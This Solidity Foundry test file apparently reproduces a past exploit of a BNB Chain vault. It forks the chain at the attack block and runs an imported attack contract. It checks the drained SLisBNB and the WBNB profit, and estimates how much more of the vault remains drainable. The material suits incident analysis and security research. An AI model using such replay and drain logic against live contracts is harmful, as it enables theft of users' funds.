// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {IERC20Like, IVault} from "../src/Tx767dInterfaces.sol";
import {Tx767dReplayLauncher} from "../src/Tx767dAttack.sol";

interface Vm {
    function createSelectFork(string calldata urlOrAlias) external returns (uint256);
    function createSelectFork(string calldata urlOrAlias, uint256 blockNumber) external returns (uint256);
    function createSelectFork(string calldata urlOrAlias, bytes32 txHash) external returns (uint256);
    function rollFork(bytes32 txHash) external;
    function expectRevert() external;
    function deal(address who, uint256 newBalance) external;
    function roll(uint256 newHeight) external;
}

contract Tx767dReplayForkTest {
    Vm internal constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));

    event log_named_uint(string key, uint256 val);
    event log_named_decimal_uint(string key, uint256 val, uint256 decimals);

    address internal constant VAULT = 0xF59818d53376d9BB6e9B3C0a264E3C610b59843D;
    address internal constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address internal constant SLISBNB = 0xB0b84D294e0C75A6abe60171b70edEb2EFd14A1B;

    uint256 internal constant ATTACK_BLOCK = 92_821_762;
    uint256 internal constant SEED_WBNB = 11.3 ether;
    bytes32 internal constant ATTACK_TX_HASH =
        0x767d8a0f2a6c2b5d1e3466bac47722a4f86a2bb9e41260dd52d274a9f100f312;
    string internal constant LOCAL_ANVIL_TX_PRESTATE_RPC = "http://127.0.0.1:8546";

    uint256 internal constant EXPECTED_VAULT_SLIS_DELTA = 3_802_931_882_574_188_786;
    uint256 internal constant EXPECTED_PROFIT_WBNB = 2_335_548_647_317_693_359;
    uint256 internal constant PRESTATE_VAULT_SLIS_BALANCE = 3_807_430_454_311_865_050;
    uint256 internal constant PRESTATE_TAX_ACCUMULATIVE_SLIS = 13_184_608_901_399_920_684;
    uint256 internal constant PRESTATE_TOTAL_CLAIMED = 9_377_178_447_088_055_634;

    function testReplayAttackFromParentBlockForkShowsSameBlockBlocker() public {
        vm.createSelectFork("bsc", ATTACK_BLOCK - 1);

        Tx767dReplayLauncher replay = new Tx767dReplayLauncher();
        vm.expectRevert();
        replay.attack();
    }

    function testReplayAttackFromAttackBlockEndStateShowsMutatedStateBlocker() public {
        vm.createSelectFork("bsc", ATTACK_BLOCK);

        Tx767dReplayLauncher replay = new Tx767dReplayLauncher();
        vm.expectRevert();
        replay.attack();
    }

    function testSimulateCoreExploitOnParentBlock() public {
        vm.createSelectFork("bsc", ATTACK_BLOCK - 1);
        vm.deal(address(this), 20 ether);

        uint256 vaultSlisBefore = IERC20Like(SLISBNB).balanceOf(VAULT);
        uint256 totalClaimedBefore = IVault(VAULT).totalClaimed();

        Tx767dReplayLauncher replay = new Tx767dReplayLauncher();
        replay.simulateWithoutFlash{value: SEED_WBNB}(SEED_WBNB);

        uint256 vaultSlisAfter = IERC20Like(SLISBNB).balanceOf(VAULT);
        uint256 totalClaimedAfter = IVault(VAULT).totalClaimed();
        uint256 finalWbnb = IERC20Like(WBNB).balanceOf(address(replay));

        require(totalClaimedAfter > totalClaimedBefore, "simulation: totalClaimed did not increase");
        require(vaultSlisAfter < vaultSlisBefore, "simulation: vault SLisBNB unchanged");
        require(finalWbnb > SEED_WBNB, "simulation: no positive WBNB spread");
    }

    function testReplayAttackFromExactTxPrestate() public {
        vm.createSelectFork(LOCAL_ANVIL_TX_PRESTATE_RPC);
        vm.roll(ATTACK_BLOCK);

        uint256 vaultSlisBefore = IERC20Like(SLISBNB).balanceOf(VAULT);
        uint256 totalClaimedBefore = IVault(VAULT).totalClaimed();

        Tx767dReplayLauncher replay = new Tx767dReplayLauncher();
        replay.attack();

        uint256 vaultSlisAfter = IERC20Like(SLISBNB).balanceOf(VAULT);
        uint256 totalClaimedAfter = IVault(VAULT).totalClaimed();
        uint256 profitWbnb = IERC20Like(WBNB).balanceOf(address(replay));

        uint256 vaultSlisDelta = vaultSlisBefore - vaultSlisAfter;
        uint256 totalClaimedDelta = totalClaimedAfter - totalClaimedBefore;

        emit log_named_decimal_uint("exact-replay: vault_slis_delta", vaultSlisDelta, 18);
        emit log_named_decimal_uint("exact-replay: profit_wnb", profitWbnb, 18);
        emit log_named_uint("exact-replay: totalClaimed_before", totalClaimedBefore);
        emit log_named_uint("exact-replay: totalClaimed_after", totalClaimedAfter);

        require(vaultSlisDelta == EXPECTED_VAULT_SLIS_DELTA, "exact-replay: vault SLisBNB delta mismatch");
        require(totalClaimedDelta == EXPECTED_VAULT_SLIS_DELTA, "exact-replay: totalClaimed delta mismatch");
        require(profitWbnb == EXPECTED_PROFIT_WBNB, "exact-replay: profit WBNB mismatch");
    }

    function testRiskUpperBoundAtTxPrestate() public {
        vm.createSelectFork(LOCAL_ANVIL_TX_PRESTATE_RPC);
        vm.roll(ATTACK_BLOCK);

        uint256 vaultSlisBal = IERC20Like(SLISBNB).balanceOf(VAULT);
        uint256 taxAcc = IVault(VAULT).taxAccumulativeSlis();
        uint256 totalClaimed = IVault(VAULT).totalClaimed();

        uint256 remainingByAccumulator = taxAcc - totalClaimed;
        uint256 maxDrainable = vaultSlisBal < remainingByAccumulator ? vaultSlisBal : remainingByAccumulator;
        uint256 residualIfSameAttack = maxDrainable - EXPECTED_VAULT_SLIS_DELTA;
        uint256 drainedBps = (EXPECTED_VAULT_SLIS_DELTA * 10_000) / maxDrainable;

        emit log_named_decimal_uint("risk: prestate_vault_slis_balance", vaultSlisBal, 18);
        emit log_named_decimal_uint("risk: prestate_taxAccumulativeSlis", taxAcc, 18);
        emit log_named_decimal_uint("risk: prestate_totalClaimed", totalClaimed, 18);
        emit log_named_decimal_uint("risk: remaining_by_accumulator", remainingByAccumulator, 18);
        emit log_named_decimal_uint("risk: max_drainable_cap", maxDrainable, 18);
        emit log_named_decimal_uint("risk: drained_in_this_tx", EXPECTED_VAULT_SLIS_DELTA, 18);
        emit log_named_decimal_uint("risk: residual_after_this_tx", residualIfSameAttack, 18);
        emit log_named_uint("risk: drained_bps_of_cap", drainedBps);

        require(vaultSlisBal == PRESTATE_VAULT_SLIS_BALANCE, "risk: vault SLisBNB balance mismatch");
        require(taxAcc == PRESTATE_TAX_ACCUMULATIVE_SLIS, "risk: taxAccumulativeSlis mismatch");
        require(totalClaimed == PRESTATE_TOTAL_CLAIMED, "risk: totalClaimed mismatch");
        require(remainingByAccumulator == vaultSlisBal, "risk: accumulator remaining != vault balance");
        require(EXPECTED_VAULT_SLIS_DELTA <= maxDrainable, "risk: expected drain exceeds cap");
    }
}
